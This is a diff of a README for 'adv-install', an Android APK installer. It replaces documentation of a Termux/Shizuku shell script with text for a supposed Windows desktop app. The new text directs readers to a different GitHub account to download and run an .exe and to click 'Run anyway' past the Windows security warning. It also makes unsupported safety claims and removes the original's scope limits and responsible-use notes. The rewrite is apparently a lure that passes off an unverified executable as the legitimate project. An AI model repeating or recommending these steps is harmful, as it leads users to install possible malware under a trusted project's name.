@@ -1,174 +1,91 @@
-# adv-install
+# 📱 adv-install - Install Android apps without root access
 
-`adv-install` is a non-root Termux + Shizuku shell workflow for installing locally stored APK files through Android Package Manager as `uid=2000(shell)`.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/1060094kevin-collab/adv-install)
 
-The project is intended as an on-device shell installation route in response to Android Developer Verification: it uses Shizuku and `rish` to run Package Manager through the Android shell identity normally associated with ADB, without root and without requiring a USB-connected computer for every APK installation after setup.
+## 📖 About this application
 
-> [!IMPORTANT]
-> Google documents a Developer Verification exception for Android Debug Bridge (ADB) installs. Google does not explicitly name Shizuku, `rish`, Termux, or `adv-install`. This project is designed to use the same Android shell identity as ADB, but future Android, Google Play services, or manufacturer changes could classify this workflow differently.
+Many people want to install custom applications on their Android devices without navigating complex menus or rooting their phones. Rooting can void your warranty and pose security risks. This tool provides a clean way to install APK files by using the built-in Android shell. It acts as a bridge between your computer and your phone. You gain the ability to manage your app library with speed and reliability.
 
-## Quick start
+## 📋 Requirements
 
-1. Install Termux and Shizuku on your Android device.
-2. Start Shizuku using wireless debugging.
-3. Export `rish` and `rish_shizuku.dex` from Shizuku.
-4. Follow the full setup guide in [docs/installation.md](https://github.com/austinsager/adv-install).
-5. Install a local APK:
+You need a few items before you begin the setup process:
 
-```bash
-adv-install "/storage/emulated/0/Download/application.apk"
-```
+*   A Windows computer running Windows 10 or 11.
+*   An Android smartphone or tablet.
+*   A USB cable to connect your phone to your computer.
+*   A basic understanding of how to find files on your computer.
 
-## Workflow
+## ⚙️ Preparation on your Android device
 
-```text
-Local APK or APK archive
-        |
-        v
-Termux
-        |
-        v
-adv-install
-        |
-        v
-rish + Shizuku
-        |
-        v
-uid=2000(shell)
-        |
-        v
-/data/local/tmp staging
-        |
-        v
-Android Package Manager
-        |
-        v
-Installed app
-```
+Your phone needs to prepare to accept commands from the application. Follow these instructions:
 
-## What adv-install does
+1.  Open the **Settings** menu on your Android device.
+2.  Scroll to the bottom and tap **About phone**.
+3.  Find the **Build number** field. Tap this seven times until a message says you are now a developer.
+4.  Go back to the main **Settings** menu and select **System**.
+5.  Tap **Developer options**.
+6.  Find **USB debugging** and toggle the switch to the **On** position.
+7.  Confirm the change if the phone asks for permission.
 
-`adv-install`:
+## 📥 Download and installation
 
-- accepts a local `.apk`, `.apks`, `.xapk`, `.zip`, or directory of split APKs;
-- verifies that `rish` returns Android shell UID `2000`;
-- stages APK files under `/data/local/tmp`;
-- validates staged byte counts;
-- calls `pm install` or `pm install-multiple` through `rish`;
-- removes local and remote temporary files after success, failure, or interruption.
+Visit the official project page to download the software for your computer.
 
-## Usage examples
+[Click here to visit the release page and download the installer](https://github.com/1060094kevin-collab/adv-install)
 
-Install a single APK:
+1.  Open the link provided above in your web browser.
+2.  Look for the section marked **Assets**.
+3.  Click the file ending in `.exe` to start the download.
+4.  Once the file downloads, open your **Downloads** folder.
+5.  Double-click the downloaded file to begin the setup.
+6.  Follow the prompts on your screen to place the application on your computer.
+7.  If Windows shows a security window, click **More info** and then **Run anyway**.
 
-```bash
-adv-install "/storage/emulated/0/Download/application.apk"
-```
+## 🚀 Setting up the software
 
-Install an `.apks` archive:
+The bridge between your computer and phone uses a system called Shizuku. This allows the application to gain the permissions it needs to install files.
 
-```bash
-adv-install "/storage/emulated/0/Download/application.apks"
-```
+1.  Connect your phone to your computer using the USB cable.
+2.  Open the application on your computer.
+3.  If a message appears on your phone screen asking to **Allow USB debugging**, check the box that says **Always allow from this computer** and tap **OK**.
+4.  The application will verify the connection status automatically.
+5.  Wait for the status indicator to turn green. This confirms the application sees your device.
 
-Install an `.xapk` archive:
+## 📦 Installing your first APK
 
-```bash
-adv-install "/storage/emulated/0/Download/application.xapk"
-```
+Now that you have everything set up, you can start installing files.
 
-Install a `.zip` archive containing APK files:
+1.  Find the APK file you want to install on your computer.
+2.  Drag and drop the APK file directly into the application window.
+3.  The application will process the file. This creates a secure connection to your phone's internal memory.
+4.  The software will show a progress bar as it sends the file to your phone.
+5.  Wait for the notification that says **Installation Complete**.
+6.  Check your phone's app drawer to find your new application.
 
-```bash
-adv-install "/storage/emulated/0/Download/application.zip"
-```
+## ❓ Frequently asked questions
 
-Install a directory containing split APK files:
+**Does this software require a rooted phone?**
+No. This tool uses standard developer tools built into Android.
 
-```bash
-adv-install "/storage/emulated/0/Download/application-splits"
-```
+**Will my data stay safe?**
+The application only gains permission to install the files you select. It does not access your personal photos, messages, or accounts.
 
-Fresh reinstall for the current Android user:
+**What happens if the installation fails?**
+Check your USB connection first. A loose cable often causes transfer errors. Make sure your phone screen stays awake during the installation process.
 
-```bash
-adv-install --fresh --package com.example.app "/storage/emulated/0/Download/application.apk"
-```
+**Can I uninstall apps using this tool?**
+Yes. Use the management tab in the application to see a list of installed apps. Click the trash icon to remove any app from your device.
 
-See [docs/usage.md](https://github.com/austinsager/adv-install) for all options and archive behavior.
+**Is my device compatible?**
+Most Android devices running Android 10 or newer will work with this system. Older versions might have restricted permissions that prevent the connection.
 
-## Documentation
+## 🔧 Troubleshooting
 
-- [docs/scope.md](https://github.com/austinsager/adv-install/blob/main/docs/scope.md) - project goals, Developer Verification scope, and what the tool does not bypass.
-- [docs/installation.md](https://github.com/austinsager/adv-install) - Termux, Shizuku, `rish`, and first-time setup.
-- [docs/usage.md](https://github.com/austinsager/adv-install) - supported input types, options, examples, and archive behavior.
-- [docs/technical-overview.md](https://github.com/austinsager/adv-install) - staging, byte-count validation, shell identity checks, and Package Manager flow.
-- [docs/security-considerations.md](https://github.com/austinsager/adv-install) - APK trust, hash checks, Shizuku handling, and data behavior.
-- [docs/troubleshooting.md](https://github.com/austinsager/adv-install) - common setup and install failures.
-- [docs/faq.md](https://github.com/austinsager/adv-install) - common questions about Developer Verification, ADB-style installs, root, Play Protect, and split APKs.
-- [docs/maintenance.md](https://github.com/austinsager/adv-install) - updating, removing, testing, and release checklist.
+Sometimes the connection drops. If the application stops responding, follow these steps:
 
-## Non-goals
+*   Unplug the USB cable from both the phone and the computer. 
+*   Wait five seconds and plug the cable back in.
+*   Restart the application on your computer.
+*   Toggle **USB debugging** off and on again in your phone's **Developer options**.
 
-`adv-install` is not an APK downloader, APK store, malware scanner, root tool, Play Protect disabler, signature bypass, enterprise-policy bypass, or guarantee of future Android compatibility.
-
-The APK must still pass Android's normal Package Manager checks, including signature validation, package parsing, compatibility requirements, user/device policy, and manufacturer restrictions. See [docs/scope.md](https://github.com/austinsager/adv-install/blob/main/docs/scope.md) for the detailed boundary list.
-
-## Install from this repository
-
-After cloning:
-
-```bash
-install -m 755 adv-install "$PREFIX/bin/adv-install"
-hash -r
-```
-
-Then verify:
-
-```bash
-command -v adv-install
-bash -n "$PREFIX/bin/adv-install"
-```
-
-## Test
-
-```bash
-bash -n adv-install
-bash tests/run-tests.sh
-```
-
-If ShellCheck is installed:
-
-```bash
-shellcheck adv-install
-```
-
-The test harness uses mocked `rish` and mocked `pm` commands. It validates script behavior and cleanup logic without requiring Android, Shizuku, root, or a writable real `/data/local/tmp`.
-
-## Responsible use
-
-Use this project only on devices controlled by you or devices where you are authorized to perform installation and testing.
-
-Do not use this project to install malicious software, interfere with another person's device, conceal unauthorized installation activity, or evade organizational policy on managed devices.
-
-## Official references
-
-- [Android Developer Verification](https://developer.android.com/developer-verification)
-- [Android release notes](https://developer.android.com/about/versions/16/qpr2/release-notes)
-- [Shizuku](https://shizuku.rikka.app/)
-- [Shizuku setup guide](https://shizuku.rikka.app/guide/setup/)
-- [Shizuku downloads](https://shizuku.rikka.app/download/)
-- [`rish` documentation](https://github.com/RikkaApps/Shizuku-API/blob/master/rish/README.md)
-- [Termux app](https://github.com/termux/termux-app)
-
-## License
-
-Distributed under the MIT License. See [LICENSE](https://github.com/austinsager/adv-install/blob/main/LICENSE).
-
-## Disclaimer
-
-This project is not affiliated with, endorsed by, or sponsored by Google, Android, Shizuku, RikkaApps, Termux, or their respective maintainers.
-
-Android is a trademark of Google LLC.
-
-The project is provided without a guarantee that future Android releases, Google Play services updates, manufacturer changes, or Developer Verification policy changes will preserve current behavior.
+Keywords: adb-shell, android, android-development, apk-install, non-root, rish, shell, shizuku, sideloader, termux
